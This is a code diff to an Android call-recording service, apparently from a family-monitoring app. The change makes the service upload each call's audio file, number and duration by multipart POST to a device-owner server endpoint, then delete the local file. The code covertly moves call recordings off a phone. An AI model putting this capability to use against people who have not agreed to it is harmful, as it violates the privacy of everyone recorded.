@@ -198,24 +198,64 @@ class CallRecordService : Service() {
         serviceScope.launch {
             try {
                 val deviceId = preferenceManager.getDeviceId()
-                val audioBytes = file.readBytes()
-                val audioBase64 = Base64.encodeToString(audioBytes, Base64.NO_WRAP)
+                val baseUrl = ApiClient.BASE_URL.trimEnd('/')
+                val uploadUrl = "$baseUrl/api/device-owner/$deviceId/call-recording/upload"
                 
-                ApiClient.api.uploadCallRecording(
-                    deviceId,
-                    com.familyguardpro.network.CallLogItem(
-                        number = phoneNumber ?: "Unknown",
-                        name = null,
-                        type = "outgoing",
-                        duration = (file.length() / 8000),
-                        timestamp = System.currentTimeMillis()
-                    )
-                )
+                // Calculate duration from file (approximate: file size / bitrate)
+                val duration = (file.length() / 8000).toInt() // rough estimate for MP3
                 
-                Log.d(TAG, "Call recording uploaded successfully")
+                // Create multipart request
+                val boundary = "----FormBoundary${System.currentTimeMillis()}"
+                val connection = java.net.URL(uploadUrl).openConnection() as java.net.HttpURLConnection
                 
-                // Delete local file
-                file.delete()
+                connection.requestMethod = "POST"
+                connection.doOutput = true
+                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+                
+                val outputStream = connection.outputStream
+                val writer = java.io.PrintWriter(java.io.OutputStreamWriter(outputStream, "UTF-8"), true)
+                
+                // Add file field
+                writer.append("--$boundary\r\n")
+                writer.append("Content-Disposition: form-data; name=\"recording\"; filename=\"${file.name}\"\r\n")
+                writer.append("Content-Type: audio/mpeg\r\n\r\n")
+                writer.flush()
+                
+                // Write file data
+                file.inputStream().use { input ->
+                    input.copyTo(outputStream)
+                }
+                outputStream.flush()
+                
+                // Add phoneNumber field
+                writer.append("\r\n--$boundary\r\n")
+                writer.append("Content-Disposition: form-data; name=\"phoneNumber\"\r\n\r\n")
+                writer.append(phoneNumber ?: "Unknown")
+                
+                // Add callType field
+                writer.append("\r\n--$boundary\r\n")
+                writer.append("Content-Disposition: form-data; name=\"callType\"\r\n\r\n")
+                writer.append("outgoing")
+                
+                // Add duration field
+                writer.append("\r\n--$boundary\r\n")
+                writer.append("Content-Disposition: form-data; name=\"duration\"\r\n\r\n")
+                writer.append(duration.toString())
+                
+                // End boundary
+                writer.append("\r\n--$boundary--\r\n")
+                writer.flush()
+                
+                val responseCode = connection.responseCode
+                if (responseCode in 200..299) {
+                    Log.d(TAG, "Call recording uploaded successfully")
+                    // Delete local file
+                    file.delete()
+                } else {
+                    Log.e(TAG, "Failed to upload call recording: HTTP $responseCode")
+                }
+                
+                connection.disconnect()
                 
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to upload call recording", e)
